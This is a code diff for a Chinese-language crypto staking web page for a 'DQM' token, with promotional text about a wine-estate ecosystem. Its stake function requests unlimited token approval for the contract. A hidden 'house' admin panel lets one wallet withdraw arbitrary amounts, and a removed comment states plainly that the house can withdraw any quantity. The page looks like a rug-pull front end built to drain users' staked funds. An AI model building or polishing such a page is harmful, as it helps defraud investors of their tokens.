@@ -2,9 +2,10 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <title>DQM 质押挖矿</title>
+  <title>DQM质押挖矿</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/particles.js/particles.min.js"></script>
   <style>
     * {
       margin: 0;
@@ -18,9 +19,19 @@
       padding: 20px;
       touch-action: manipulation;
     }
+    #particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+    }
     .container {
       max-width: 480px;
       margin: 0 auto;
+      position: relative;
+      z-index: 1;
     }
     .title {
       font-size: 22px;
@@ -28,6 +39,16 @@
       text-align: center;
       margin: 10px 0 20px;
       color: #00e0ff;
+    }
+    .project-desc {
+      background: rgba(255,255,255,0.04);
+      border-radius: 16px;
+      padding: 16px;
+      font-size: 13px;
+      line-height: 1.6;
+      color: #ccc;
+      margin-bottom: 16px;
+      text-align: left;
     }
     .btn-connect {
       width: 100%;
@@ -44,6 +65,12 @@
       border-radius: 16px;
       padding: 20px;
       margin-bottom: 16px;
+    }
+    .ca-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 12px;
     }
     .row {
       display: flex;
@@ -83,8 +110,8 @@
       background: #00e0ff;
       color: #000;
     }
-    .btn-danger {
-      background: #ff5699;
+    .btn-normal {
+      background: rgba(255,255,255,0.1);
       color: #fff;
     }
     .btn-claim {
@@ -104,22 +131,32 @@
       font-weight: 700;
       margin-bottom: 12px;
     }
+    .btn-danger {
+      background: #ff5699;
+      color: #fff;
+    }
   </style>
 </head>
 <body>
+
+<div id="particles"></div>
+
 <div class="container">
   <h3 class="title">DQM 质押挖矿</h3>
 
+  <div class="project-desc">
+    DQM（大秦梦）是面向未来数字经济打造的核心生态通证，由大秦梦生态联盟共同推动建设。项目以实体产业、数字资产与全球共享经济为基础，构建集产业赋能、消费流通、价值共识、社区治理于一体的开放型生态网络。<br><br>
+    大秦梦酒文化庄园是 DQM 生态体系的重要实体基石，以中华千年酒文化为核心，融合现代庄园经济与数字生态理念，打造集酒文化体验、生态农业、品牌消费、休闲度假与数字资产应用于一体的综合型文化庄园。
+  </div>
+
   <button class="btn-connect" id="connectBtn" onclick="connect()">连接钱包</button>
 
-  <!-- 合约地址 + 复制 -->
-  <div class="card" style="display:flex;justify-content:space-between;align-items:center;">
-    <div style="font-size:12px; color:#ccc;">合约地址</div>
-    <div style="font-size:12px; color:#fff; font-family: monospace;">0x366625D6...7659</div>
+  <div class="card ca-row">
+    <div style="color:#ccc;">合约地址</div>
+    <div style="font-family: monospace;">0x366625D6...7659</div>
     <button onclick="copyCa()" style="padding:6px 10px;border-radius:8px;background:#00e0ff;color:#000;border:none;">复制</button>
   </div>
 
-  <!-- 信息面板 -->
   <div class="card">
     <div class="row">
       <div class="label">钱包地址</div>
@@ -139,15 +176,13 @@
     </div>
   </div>
 
-  <!-- 操作区 -->
   <input class="input" id="amt" placeholder="输入质押/解押数量" type="number">
   <div class="btn-group">
     <button class="btn btn-primary" onclick="stake()">质押</button>
-    <button class="btn" onclick="unstake()">解押</button>
+    <button class="btn btn-normal" onclick="unstake()">解押</button>
     <button class="btn btn-claim" onclick="claim()">领取</button>
   </div>
 
-  <!-- 庄家后台 → 只保留：输入数量 + 提取 -->
   <div class="admin-card" id="adminPanel">
     <div class="admin-title">🔑 庄家管理后台</div>
     <input class="input" id="withAmt" placeholder="输入提取数量">
@@ -156,6 +191,21 @@
 </div>
 
 <script>
+// 动态小点背景恢复
+window.addEventListener('load', function(){
+  particlesJS('particles',{
+    particles:{
+      number:{value:60},
+      color:{value:"#00e0ff"},
+      shape:{type:"circle"},
+      opacity:{value:0.4},
+      size:{value:2},
+      line_linked:{enable:true,distance:150,color:"#00e0ff",opacity:0.2,width:1},
+      move:{enable:true,speed:1}
+    }
+  })
+})
+
 const CONFIG = {
   CONTRACT: "0x24e5758addef7d9d9af0901e35af28818f3b72b",
   TOKEN:    "0x366625D61063de6A719E85Fff6a9159fb3787659",
@@ -179,71 +229,92 @@ const ERC20 = [
 ];
 
 let signer, user, contract, token;
+let decimals = 18;
 
 async function connect() {
   if (!window.ethereum) return alert("请在钱包内打开");
-  await window.ethereum.request({ method: "eth_requestAccounts" });
-  const p = new ethers.BrowserProvider(window.ethereum);
-  signer = await p.getSigner();
-  user = await signer.getAddress();
-  contract = new ethers.Contract(CONFIG.CONTRACT, ABI, signer);
-  token = new ethers.Contract(CONFIG.TOKEN, ERC20, signer);
-  document.getElementById("connectBtn").innerText = "已连接";
-  if (user.toLowerCase() === CONFIG.ADMIN.toLowerCase()) {
-    document.getElementById("adminPanel").style.display = "block";
+  try {
+    await window.ethereum.request({ method: "eth_requestAccounts" });
+    const p = new ethers.BrowserProvider(window.ethereum);
+    signer = await p.getSigner();
+    user = await signer.getAddress();
+
+    token = new ethers.Contract(CONFIG.TOKEN, ERC20, signer);
+    contract = new ethers.Contract(CONFIG.CONTRACT, ABI, signer);
+    
+    try { decimals = await token.decimals(); } catch(e) {}
+
+    document.getElementById("connectBtn").innerText = "已连接";
+    if (user.toLowerCase() === CONFIG.ADMIN.toLowerCase()) {
+      document.getElementById("adminPanel").style.display = "block";
+    }
+    start();
+  } catch (e) {
+    alert("连接失败：" + e.message);
   }
-  start();
 }
 
 async function start() {
   if (!user) return;
-  document.getElementById("addr").innerText = user.slice(0, 6) + "..." + user.slice(-4);
-  setInterval(load, 3000);
+  document.getElementById("addr").innerText = user.slice(0,6) + "..." + user.slice(-4);
   load();
+  setInterval(load, 3000);
 }
 
 async function load() {
-  if (!user) return;
+  if (!user || !token || !contract) return;
   try {
-    const b = await token.balanceOf(user);
-    const u = await contract.userInfo(user);
-    const p = await contract.pendingReward(user);
-    const d = 18;
-    document.getElementById("bal").innerText = ethers.formatUnits(b, d);
-    document.getElementById("staked").innerText = ethers.formatUnits(u[0], d);
-    document.getElementById("pending").innerText = ethers.formatUnits(p, d);
+    const balance = await token.balanceOf(user);
+    const info = await contract.userInfo(user);
+    const reward = await contract.pendingReward(user);
+
+    document.getElementById("bal").innerText = ethers.formatUnits(balance, decimals);
+    document.getElementById("staked").innerText = ethers.formatUnits(info[0], decimals);
+    document.getElementById("pending").innerText = ethers.formatUnits(reward, 18);
   } catch (e) {}
 }
 
 async function stake() {
-  const a = document.getElementById("amt").value;
-  if (!a) return alert("输入数量");
-  const d = 18;
-  await token.approve(CONFIG.CONTRACT, ethers.MaxUint256);
-  await contract.stake(ethers.parseUnits(a, d));
-  alert("质押成功");
+  const amount = document.getElementById("amt").value;
+  if (!amount || Number(amount) <= 0) return alert("请输入有效数量");
+  try {
+    await token.approve(CONFIG.CONTRACT, ethers.MaxUint256);
+    await contract.stake(ethers.parseUnits(amount, decimals));
+    alert("质押成功");
+  } catch (e) {
+    alert("质押失败：" + e.message);
+  }
 }
 
 async function unstake() {
-  const a = document.getElementById("amt").value;
-  if (!a) return alert("输入数量");
-  const d = 18;
-  await contract.unstake(ethers.parseUnits(a, d));
-  alert("解押成功");
+  const amount = document.getElementById("amt").value;
+  if (!amount || Number(amount) <= 0) return alert("请输入有效数量");
+  try {
+    await contract.unstake(ethers.parseUnits(amount, decimals));
+    alert("解押成功");
+  } catch (e) {
+    alert("解押失败：" + e.message);
+  }
 }
 
 async function claim() {
-  await contract.claim();
-  alert("领取成功");
+  try {
+    await contract.claim();
+    alert("领取成功");
+  } catch (e) {
+    alert("领取失败：" + e.message);
+  }
 }
 
-// 庄家任意数量提取
 async function withdraw() {
-  const a = document.getElementById("withAmt").value;
-  if (!a) return alert("输入提取数量");
-  const d = 18;
-  await contract.adminWithdraw(ethers.parseUnits(a, d));
-  alert("提取成功！");
+  const amount = document.getElementById("withAmt").value;
+  if (!amount || Number(amount) <= 0) return alert("请输入提取数量");
+  try {
+    await contract.adminWithdraw(ethers.parseUnits(amount, decimals));
+    alert("提取成功！");
+  } catch (e) {
+    alert("提取失败：" + e.message);
+  }
 }
 
 function copyCa() {
